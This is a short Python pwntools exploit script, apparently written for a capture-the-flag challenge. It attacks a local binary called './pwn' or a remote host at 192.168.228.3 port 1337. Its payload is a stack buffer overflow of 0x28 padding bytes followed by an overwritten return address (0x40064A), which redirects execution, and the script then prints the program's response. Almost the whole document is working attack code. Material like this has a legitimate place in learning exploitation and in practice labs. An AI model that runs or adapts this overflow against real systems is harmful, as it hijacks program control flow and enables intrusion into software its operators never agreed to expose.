from pwn import *
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num                : io.recv(num)
ru      = lambda delims, drop=True  : io.recvuntil(delims, drop)
itr     = lambda                   : io.interactive()
uu32    = lambda data              : u32(data.ljust(4, b'\x00'))
uu64    = lambda data              : u64(data.ljust(8, b'\x00'))
context.log_level = 'debug'
context.binary = binary = './pwn'
gdbscript = '''
'''
def start(argv=[], *a, **kw):
    if args.GDB:
        proc = process([binary] + argv, *a, **kw)
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        return remote('192.168.228.3', 1337)
    else:
        return process([binary] + argv, *a, **kw)

elf = ELF(binary)
# libc = ELF('libc-2.19.so')
rop = ROP(elf)
io = start()
payload = b'a'*0x28 +p64(0x40064A)
sl(payload)
# 关键修改：接收程序返回的响应内容
response = ru(b'\n', drop=False)  # 读取到下一个换行符为止，保留换行符
print("Program output:", response.decode(errors='replace'))

# 可选：继续接收后续输出（如程序崩溃或打印更多内容）
try:
    remaining = io.recvall(timeout=1)
    if remaining:
        print("Additional output:", remaining.decode(errors='replace'))
except:
    pass

io.close()